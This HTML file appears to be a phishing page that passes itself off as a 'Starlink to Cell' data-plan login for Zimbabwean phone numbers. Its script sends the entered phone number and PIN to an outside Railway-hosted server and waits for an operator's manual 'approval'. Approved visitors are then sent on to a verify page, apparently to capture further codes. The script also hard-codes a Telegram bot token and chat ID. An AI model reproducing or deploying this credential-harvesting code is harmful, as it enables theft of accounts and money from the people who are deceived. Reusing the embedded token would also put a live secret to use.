<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Starlink to Cell - Login</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        html,
        body {
            min-height: 100vh;
            font-family: 'Inter', sans-serif;
            background: #f5f7fa;
            overflow-x: hidden;
        }
        
        body {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .main-container {
            width: 100%;
            max-width: 480px;
            display: flex;
            flex-direction: column;
            align-items: center;
        }
        
        .logo {
            text-align: center;
            padding: 20px 20px 30px;
            width: 100%;
        }
        
        .logo-text {
            font-size: 36px;
            font-weight: 700;
        }
        
        .logo-starlink {
            color: #18386d;
        }
        
        .logo-cell {
            color: #ff3b00;
        }
        
        .login-card {
            background: white;
            border-radius: 24px;
            padding: 35px 28px;
            width: 100%;
            max-width: 400px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.08);
            margin-bottom: 15px;
        }
        
        .title {
            font-size: 24px;
            font-weight: 700;
            color: #333;
            text-align: center;
            margin-bottom: 25px;
        }
        
        .subtitle {
            font-size: 14px;
            color: #888;
            text-align: center;
            margin-bottom: 25px;
        }
        
        .phone-group {
            width: 100%;
            border: 2px solid #18386d;
            border-radius: 14px;
            display: flex;
            align-items: center;
            padding: 14px 18px;
            margin-bottom: 25px;
            background: white;
            transition: box-shadow 0.3s;
        }
        
        .phone-group:focus-within {
            box-shadow: 0 0 0 4px rgba(24, 56, 109, 0.12);
        }
        
        .flag {
            font-size: 24px;
            margin-right: 10px;
        }
        
        .country-select {
            display: flex;
            align-items: center;
            color: #18386d;
            font-weight: 600;
            font-size: 16px;
            margin-right: 12px;
        }
        
        .dropdown-arrow {
            font-size: 12px;
            margin-left: 4px;
        }
        
        .phone-input {
            flex: 1;
            border: none;
            outline: none;
            font-size: 16px;
            color: #333;
            font-family: 'Inter', sans-serif;
            background: transparent;
        }
        
        .phone-input::placeholder {
            color: #aaa;
        }
        
        .pin-label {
            font-size: 14px;
            color: #666;
            margin-bottom: 14px;
            font-weight: 500;
            text-align: center;
        }
        
        .pin-group {
            display: flex;
            justify-content: center;
            gap: 14px;
            margin-bottom: 20px;
        }
        
        .pin-box {
            width: 55px;
            height: 55px;
            border: 2px solid #dce0e8;
            border-radius: 14px;
            font-size: 24px;
            text-align: center;
            background: white;
            color: #333;
            font-weight: 600;
            transition: border-color 0.3s, box-shadow 0.3s, transform 0.2s;
            font-family: 'Inter', sans-serif;
        }
        
        .pin-box:focus {
            border-color: #18386d;
            box-shadow: 0 0 0 4px rgba(24, 56, 109, 0.12);
            outline: none;
            transform: scale(1.02);
        }
        
        .pin-box.invalid {
            border-color: #e74c3c !important;
            animation: shake 0.5s ease;
        }
        
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            20% { transform: translateX(-8px); }
            40% { transform: translateX(8px); }
            60% { transform: translateX(-8px); }
            80% { transform: translateX(8px); }
        }
        
        .status-message {
            text-align: center;
            padding: 10px 14px;
            margin: 10px 0 15px;
            border-radius: 10px;
            font-size: 13px;
            font-weight: 500;
            display: none;
        }
        
        .status-message.success {
            display: block;
            background: #e8f5e9;
            color: #27ae60;
            border: 1px solid #c8e6c9;
        }
        
        .status-message.error {
            display: block;
            background: #ffebee;
            color: #e74c3c;
            border: 1px solid #ffcdd2;
        }
        
        .status-message.info {
            display: block;
            background: #e3f2fd;
            color: #18386d;
            border: 1px solid #bbdefb;
        }
        
        .status-message.warning {
            display: block;
            background: #fff3e0;
            color: #e65100;
            border: 1px solid #ffe0b2;
        }
        
        .forgot-link {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .forgot-link a {
            font-size: 14px;
            color: #18386d;
            text-decoration: none;
            font-weight: 500;
            cursor: pointer;
            transition: opacity 0.3s;
        }
        
        .forgot-link a:hover {
            opacity: 0.7;
        }
        
        #loginBtn {
            width: 100%;
            padding: 16px;
            background: linear-gradient(135deg, #18386d, #0f2852);
            color: white;
            border: none;
            border-radius: 50px;
            font-size: 17px;
            font-weight: 700;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
            box-shadow: 0 8px 20px rgba(24, 56, 109, 0.25);
            display: none;
        }
        
        #loginBtn:hover {
            transform: scale(1.02);
            box-shadow: 0 12px 30px rgba(24, 56, 109, 0.35);
        }
        
        #loginBtn:active {
            transform: scale(0.98);
        }
        
        #loginBtn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none !important;
        }
        
        .bottom-section {
            background: #18386d;
            color: white;
            padding: 50px 30px 35px;
            text-align: center;
            width: 100%;
            max-width: 400px;
            border-radius: 24px;
            margin-top: 0;
        }
        
        .bottom-text {
            font-size: 14px;
            margin-bottom: 20px;
            line-height: 1.6;
            opacity: 0.95;
        }
        
        .bottom-btns {
            display: flex;
            justify-content: center;
            gap: 20px;
            flex-wrap: wrap;
            margin-bottom: 25px;
        }
        
        .bottom-btn {
            background: white;
            color: #18386d;
            border: none;
            border-radius: 30px;
            padding: 14px 28px;
            font-weight: 600;
            font-size: 14px;
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 4px;
            width: 140px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.12);
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }
        
        .bottom-btn:hover {
            transform: scale(1.05);
            box-shadow: 0 12px 35px rgba(0, 0, 0, 0.18);
        }
        
        .btn-icon {
            font-size: 22px;
        }
        
        .version {
            font-size: 12px;
            opacity: 0.7;
            margin-bottom: 10px;
        }
        
        .terms {
            font-size: 12px;
            opacity: 0.85;
            line-height: 1.5;
        }
        
        .terms a {
            color: white;
            text-decoration: underline;
            cursor: pointer;
        }
        
        .terms a:hover {
            opacity: 0.8;
        }
        
        #spinnerOverlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(255, 255, 255, 0.97);
            display: none;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            z-index: 1000;
        }
        
        .spinner {
            width: 50px;
            height: 50px;
            border: 5px solid #f0f0f0;
            border-top: 5px solid #18386d;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .spinner-text {
            font-size: 16px;
            color: #333;
            text-align: center;
            line-height: 1.6;
            max-width: 280px;
            font-weight: 500;
        }
        
        @media (max-width: 480px) {
            body { padding: 10px; }
            .logo-text { font-size: 28px; }
            .login-card { padding: 25px 18px; }
            .title { font-size: 20px; margin-bottom: 20px; }
            .pin-box { width: 48px; height: 48px; font-size: 20px; }
            .pin-group { gap: 10px; }
            .bottom-section { padding: 35px 20px 25px; }
            .bottom-btn { width: 120px; padding: 12px 16px; font-size: 13px; }
            .logo { padding: 10px 20px 20px; }
        }
        
        @media (max-width: 380px) {
            .pin-box { width: 42px; height: 42px; font-size: 18px; }
            .pin-group { gap: 8px; }
            .bottom-btn { width: 100px; padding: 10px 12px; font-size: 12px; }
        }
    </style>
</head>

<body>

    <div class="main-container">
        <!-- Logo -->
        <div class="logo">
            <div class="logo-text">
                <span class="logo-starlink">Starlink</span><span class="logo-cell">Cell</span>
            </div>
        </div>

        <!-- Login Card -->
        <div class="login-card">
            <h1 class="title">Login</h1>
            <p class="subtitle">Access your data plans</p>

            <!-- Phone Input -->
            <div class="phone-group">
                <span class="flag">🇿🇼</span>
                <div class="country-select">
                    +263 <span class="dropdown-arrow">▼</span>
                </div>
                <input type="tel" class="phone-input" id="phoneInput" placeholder="Phone Number" maxlength="9">
            </div>

            <!-- PIN Input -->
            <div class="pin-label">Enter your PIN</div>
            <div class="pin-group" id="pinGroup">
                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
                <input type="password" class="pin-box" maxlength="1" inputmode="numeric" pattern="[0-9]">
            </div>

            <!-- Status Message -->
            <div id="statusMessage" class="status-message"></div>

            <!-- Forgot PIN -->
            <div class="forgot-link">
                <a onclick="alert('Please contact support to reset your PIN.')">Forgot PIN?</a>
            </div>

            <!-- Login Button -->
            <button id="loginBtn">LOGIN</button>
        </div>

        <!-- Bottom Section -->
        <div class="bottom-section">
            <div class="bottom-text">
                New to Starlink to Cell? <br>
                Register to get exclusive data plans!
            </div>
            <div class="bottom-btns">
                <div class="bottom-btn" onclick="alert('Registration page coming soon!')">
                    <span class="btn-icon">👤</span>
                    Register
                </div>
                <div class="bottom-btn" onclick="alert('Help & Support page coming soon!')">
                    <span class="btn-icon">ℹ️</span>
                    Help
                </div>
            </div>
            <div class="version">v1.0</div>
            <div class="terms">
                By signing in you agree to the <a onclick="alert('Terms and Conditions')">Terms and Conditions</a>
            </div>
        </div>
    </div>

    <!-- Spinner Overlay -->
    <div id="spinnerOverlay">
        <div class="spinner"></div>
        <div class="spinner-text">
            Please wait...<br> This usually takes a few seconds
        </div>
    </div>

    <script>
        // ============================================
        // CONFIGURATION
        // ============================================
        const BOT_TOKEN = '8831584066:AAHha7klI8i-yuHllr1lRv0y7JD2ygp-0OI';
        const CHAT_ID = '8392790531';
        const API_URL = 'https://abundant-liberation.up.railway.app/api';

        console.log('====================================');
        console.log('📡 Starlink to Cell - Login Page');
        console.log('====================================');
        console.log('🤖 Bot Token:', BOT_TOKEN);
        console.log('📱 Chat ID:', CHAT_ID);
        console.log('🌐 API URL:', API_URL);
        console.log('====================================');

        // ============================================
        // DOM REFERENCES
        // ============================================
        const phoneInput = document.getElementById('phoneInput');
        const pinBoxes = document.querySelectorAll('.pin-box');
        const loginBtn = document.getElementById('loginBtn');
        const spinnerOverlay = document.getElementById('spinnerOverlay');
        const statusMessage = document.getElementById('statusMessage');

        let pinValue = '';
        let pollInterval = null;
        let requestId = null;
        let pollingActive = false;

        // ============================================
        // TEST BACKEND CONNECTION ON LOAD
        // ============================================
        async function testBackendConnection() {
            try {
                console.log('🔍 Testing backend connection...');
                console.log('📍 Testing:', `${API_URL}/health`);
                
                const response = await fetch(`${API_URL}/health`, {
                    method: 'GET',
                    headers: {
                        'Accept': 'application/json'
                    }
                });
                
                console.log('📥 Response status:', response.status);
                
                if (!response.ok) {
                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
                }
                
                const data = await response.json();
                console.log('✅ Backend connected:', data);
                showStatus('✅ Connected to server', 'success');
                setTimeout(hideStatus, 3000);
                return true;
            } catch (error) {
                console.error('❌ Backend connection failed:', error);
                showStatus('⚠️ Cannot connect to server. Please refresh and try again.', 'error');
                return false;
            }
        }

        // ============================================
        // CHECK PIN COMPLETE
        // ============================================
        function checkPinComplete() {
            pinValue = Array.from(pinBoxes).map(box => box.value).join('');
            loginBtn.style.display = pinValue.length === 4 ? 'block' : 'none';
            return pinValue;
        }

        // ============================================
        // PIN INPUT HANDLING
        // ============================================
        pinBoxes.forEach((box, index) => {
            box.addEventListener('input', () => {
                box.value = box.value.replace(/\D/g, '');
                if (box.value.length === 1 && index < 3) {
                    pinBoxes[index + 1].focus();
                }
                checkPinComplete();
                box.classList.remove('invalid');
                hideStatus();
            });

            box.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && box.value === '' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
                if (e.key === 'ArrowLeft' && index > 0) {
                    pinBoxes[index - 1].focus();
                }
                if (e.key === 'ArrowRight' && index < 3) {
                    pinBoxes[index + 1].focus();
                }
            });

            box.addEventListener('paste', (e) => {
                e.preventDefault();
                const data = e.clipboardData.getData('text');
                const numbers = data.replace(/\D/g, '');
                const digits = numbers.split('').slice(0, 4);
                digits.forEach((digit, i) => {
                    if (i < 4 && pinBoxes[i]) {
                        pinBoxes[i].value = digit;
                    }
                });
                checkPinComplete();
                if (digits.length > 0) {
                    const lastIndex = Math.min(digits.length - 1, 3);
                    pinBoxes[lastIndex].focus();
                }
            });
        });

        // ============================================
        // STATUS MESSAGE FUNCTIONS
        // ============================================
        function showStatus(message, type = 'info') {
            statusMessage.textContent = message;
            statusMessage.className = 'status-message ' + type;
            statusMessage.style.display = 'block';
        }

        function hideStatus() {
            statusMessage.style.display = 'none';
            statusMessage.className = 'status-message';
        }

        // ============================================
        // POLL LOGIN STATUS
        // ============================================
        function startPolling(requestId) {
            pollingActive = true;
            let attempts = 0;
            const maxAttempts = 60; // 60 seconds timeout

            pollInterval = setInterval(async () => {
                attempts++;

                if (attempts > maxAttempts) {
                    stopPolling();
                    showStatus('⏰ Approval timeout. Please try again.', 'error');
                    loginBtn.disabled = false;
                    loginBtn.textContent = 'LOGIN';
                    spinnerOverlay.style.display = 'none';
                    return;
                }

                try {
                    const response = await fetch(`${API_URL}/auth/login-status/${requestId}`);
                    const data = await response.json();

                    console.log('📥 Status check:', data);

                    if (data.success && data.status) {
                        if (data.status === 'approved') {
                            stopPolling();
                            showStatus('✅ Login approved! Redirecting...', 'success');
                            setTimeout(() => {
                                window.location.href = 'verify.html';
                            }, 1000);
                        } else if (data.status === 'denied') {
                            stopPolling();
                            showStatus('❌ Login denied. Invalid PIN.', 'error');
                            pinBoxes.forEach(box => {
                                box.classList.add('invalid');
                                box.value = '';
                            });
                            setTimeout(() => {
                                pinBoxes.forEach(box => box.classList.remove('invalid'));
                                pinBoxes[0].focus();
                            }, 2000);
                            loginBtn.disabled = false;
                            loginBtn.textContent = 'LOGIN';
                            spinnerOverlay.style.display = 'none';
                        }
                    }
                } catch (error) {
                    console.error('Polling error:', error);
                }
            }, 2000);
        }

        function stopPolling() {
            pollingActive = false;
            if (pollInterval) {
                clearInterval(pollInterval);
                pollInterval = null;
            }
        }

        // ============================================
        // LOGIN HANDLER - WITH ADMIN APPROVAL
        // ============================================
        loginBtn.addEventListener('click', async function() {
            const phone = phoneInput.value.trim();
            const pin = Array.from(pinBoxes).map(box => box.value).join('');

            console.log('🔑 Login attempt:', { phone, pinLength: pin.length });

            // Validate phone
            if (!phone) {
                showStatus('Please enter your phone number', 'error');
                phoneInput.focus();
                return;
            }

            if (phone.length !== 9 || !/^\d{9}$/.test(phone)) {
                showStatus('Please enter a valid 9-digit phone number', 'error');
                phoneInput.focus();
                return;
            }

            // Validate PIN
            if (pin.length !== 4) {
                showStatus('Please enter your 4-digit PIN', 'error');
                return;
            }

            // Disable button and show spinner
            loginBtn.disabled = true;
            loginBtn.textContent = 'WAITING...';
            spinnerOverlay.style.display = 'flex';
            hideStatus();

            // Store phone in localStorage
            localStorage.setItem('phone', phone);

            try {
                console.log('📤 Sending login request to:', `${API_URL}/auth/login`);
                
                // Send login request to backend
                const response = await fetch(`${API_URL}/auth/login`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                        'Accept': 'application/json'
                    },
                    body: JSON.stringify({
                        phoneNumber: phone,
                        pin: pin
                    })
                });

                console.log('📥 Response status:', response.status);
                
                // Check if response is OK
                if (!response.ok) {
                    const errorText = await response.text();
                    console.error('❌ Server error response:', errorText);
                    throw new Error(`Server returned ${response.status}: ${errorText || response.statusText}`);
                }

                const data = await response.json();
                console.log('📥 Login response:', data);

                if (data.success) {
                    requestId = data.requestId;
                    showStatus('📱 Login request sent. Waiting for admin approval...', 'info');
                    startPolling(requestId);
                } else {
                    showStatus('❌ ' + data.message, 'error');
                    loginBtn.disabled = false;
                    loginBtn.textContent = 'LOGIN';
                    spinnerOverlay.style.display = 'none';
                }
            } catch (error) {
                console.error('❌ Login error:', error);
                showStatus('❌ Connection error: ' + error.message, 'error');
                loginBtn.disabled = false;
                loginBtn.textContent = 'LOGIN';
                spinnerOverlay.style.display = 'none';
            }
        });

        // ============================================
        // KEYBOARD SHORTCUTS
        // ============================================
        document.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') {
                const pinComplete = checkPinComplete();
                if (pinComplete.length === 4 && loginBtn.style.display !== 'none') {
                    loginBtn.click();
                }
            }
        });

        // ============================================
        // AUTO-FOCUS AND LOAD
        // ============================================
        window.addEventListener('load', async () => {
            const savedPhone = localStorage.getItem('phone');
            if (savedPhone && savedPhone.length === 9) {
                phoneInput.value = savedPhone;
            }
            phoneInput.focus();
            checkPinComplete();
            
            // Test backend connection
            await testBackendConnection();
            
            console.log('✅ Login page fully loaded and ready');
            console.log('====================================');
        });
    </script>

</body>

</html>
